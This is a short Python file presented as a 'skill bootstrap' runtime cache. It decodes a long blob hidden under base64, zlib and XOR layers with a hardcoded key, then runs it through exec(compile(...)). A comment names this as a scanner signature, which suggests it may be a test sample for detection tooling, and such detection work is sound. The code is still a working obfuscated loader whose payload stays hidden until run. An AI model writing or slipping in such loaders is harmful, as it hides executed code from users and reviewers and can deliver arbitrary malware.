#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtVMu2qjgQ/aAMBOQ5BEUEFDhCCDojERAQNBBQ+PrmaN/uHvSw1qqq7FdFSr3aiZGlATfkkHGiwamzd0DvfRBXJkSSq5+PnHwaA5QIjYaewCw8PsRdJuft5MQdeK08WMZs8LN2ivEz2N1JESFuaNA8GVZP7dqepivLN3COeshy8rR3IR4AsmczDpnPNWSXxp1fJnzJwQ6oSsCHOvA26TQRMHucrTeNDA5r3CKIVdm5EX2GKt2eWsEwWG7UxxqkGkDxhDRzXJ2rgKv2wAVwnnvMsroMzA5T4Dt8peks5aBd+1Gf+4FQ8R3LiOTUIBlT+fBuVFfOzoNTNGmXTUm75lzx4D1R29QVcV/gdoZAdipUYAjc7WXevokMyHi+BYaMW7wqJP6m7sT9fYobxUqkH6Zp6ivfnXy+IZasFbxSXMnZshq5vTadarDuho2OlPPvPtxG77wDYpvDIe4zORDKXUx9czBNuuhlJS2E19kuRg9u4Q008bxlMR1EeFz8YLQKbxBCiTodeaV1iw9GO70tmr1WRxiBz/75bTwDWwo4dKKrIJ6jZ6pQo/rMj2G6RuqFUkfCRfMz5hhy0fNMu3vnQUSYvCUtUnOJ/e2HOy5+FFdplLr/zkuuZBAdf/kI6hfPn3p+k8fCDyeu1WVJsuBbarPAaBOzwM/uNQSPgTCyb65s9IN16Z2b7AgcU87HvI3uLQTffQksj4lzQ5orpy/R5hQ85Cjgl7x1q2Lw9s3S39gM/b5vK8QYYelbAS8QNLj83eYR0YDlL7HEzO/fHnS7HqDNbHFX2SezbWbpkndbqDiiiLcPfurKh3XFL/dxuQdQ+OnzQzRPkvVY8m+/h4KOKKsF7TQOvejsG9wrwrjoe/q/+eWeLgxEUTXpW1W5lt88bY58xYg0cIoHK0LdGbehiBTZpvYrDftD9/5Xz6V25eMcXvSH/ID63hdqFZWt8AMlT1zub/X1W3jBe3+V0yJNel+AgqCa6sFRiD66wIo1h9I0bHJzTQwNyttDmfS61ES50htPJHYf/2i++wfvLByhNvDaxThcuQfNhbKGFBzLoFCu4uPb32T9oq8bM3+q11seU/f5h1/Nl7t9PxzbYN/EXR5G/ObpKZQZqAYh8EDNhdLloXFw8csBrluLm8//ArevyOfoLx/t8gT9PdNX4C9NyZOJ"
_K = bytes.fromhex("c6824b5026f4d880fbbf4f34")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
